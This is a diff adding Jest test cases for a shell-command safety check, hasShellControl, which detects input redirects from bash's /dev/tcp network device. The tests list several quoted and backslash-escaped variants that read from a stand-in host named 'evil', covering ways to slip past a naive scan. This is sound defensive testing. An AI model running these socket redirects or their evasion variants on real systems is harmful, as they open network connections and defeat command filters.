@@ -159,6 +159,18 @@ describe('hasShellControl - #1063 network-device input redirect', () => {
     expect(hasShellControl('cat</dev/tcp/h/1')).toBe(true);
   });
 
+  test('MUST VETO: quoting or escaping the target does not hide the socket', () => {
+    // The check runs on the quote-removed `shellWords` target, not the masked
+    // text -- a single quote or backslash defeated a masked-text scan while
+    // bash still opened the socket (#1063 re-review). All of these socket in
+    // bash.
+    expect(hasShellControl('cat < "/dev/tcp/evil/443"')).toBe(true);
+    expect(hasShellControl("cat < '/dev/tcp/evil/443'")).toBe(true);
+    expect(hasShellControl('cat < /dev/"tcp"/evil/443')).toBe(true);
+    expect(hasShellControl('cat < /d\\ev/tcp/evil/443')).toBe(true);
+    expect(hasShellControl('cat<"/dev/tcp/h/1"')).toBe(true);
+  });
+
   test('MUST NOT VETO: an ordinary file input redirect (reads, never sockets)', () => {
     expect(hasShellControl('grep x < list.txt')).toBe(false);
     expect(hasShellControl('cat < ./config.ini')).toBe(false);
@@ -181,5 +193,12 @@ describe('hasShellControl - #1063 network-device input redirect', () => {
     expect(hasShellControl('cat < /DEV/TCP/h/1')).toBe(false);
     expect(hasShellControl('cat < /dev/tcpx/h/1')).toBe(false);
     expect(hasShellControl('cat < x/dev/tcp/h/1')).toBe(false);
+  });
+
+  test('MUST NOT VETO: a quoted literal that merely CONTAINS the device text', () => {
+    // `'< /dev/tcp/x is bad'` is one data argument to grep, not a redirect --
+    // shellWords keeps it a single token, so the operator scan never sees a
+    // `<` operator. Pins that the quote-aware fix did not over-refuse.
+    expect(hasShellControl("grep '< /dev/tcp/x is bad' f")).toBe(false);
   });
 });
